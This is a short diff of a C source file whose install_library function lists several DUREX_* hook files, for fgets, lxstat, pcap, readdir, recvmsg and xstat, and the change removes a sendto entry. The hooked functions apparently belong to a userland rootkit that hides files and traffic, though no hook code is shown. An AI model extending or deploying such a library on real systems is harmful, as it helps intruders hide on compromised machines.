@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/08/14 01:44:46 by root              #+#    #+#             */
-/*   Updated: 2018/08/15 18:04:45 by root             ###   ########.fr       */
+/*   Updated: 2018/08/16 16:55:08 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -32,11 +32,9 @@ static char *mystrcpy(char *s1, const char *s2)
 int				install_library()
 {
 	const char	*files[] = { DUREX_FGETS_FILE, DUREX_LXSTAT_FILE, DUREX_PCAP_FILE,
-							 DUREX_READDIR_FILE, DUREX_RECVMSG_FILE, DUREX_SENDTO_FILE,
-							 DUREX_XSTAT_FILE };
+							 DUREX_READDIR_FILE, DUREX_RECVMSG_FILE, DUREX_XSTAT_FILE };
 	const char	*src[] = { DUREX_FGETS_SRC, DUREX_LXSTAT_SRC, DUREX_PCAP_SRC,
-						   DUREX_READDIR_SRC, DUREX_RECVMSG_SRC, DUREX_SENDTO_SRC,
-						   DUREX_XSTAT_SRC };
+						   DUREX_READDIR_SRC, DUREX_RECVMSG_SRC, DUREX_XSTAT_SRC };
 	char		cmd[1024];
 	int			fd;
 	size_t		ret;
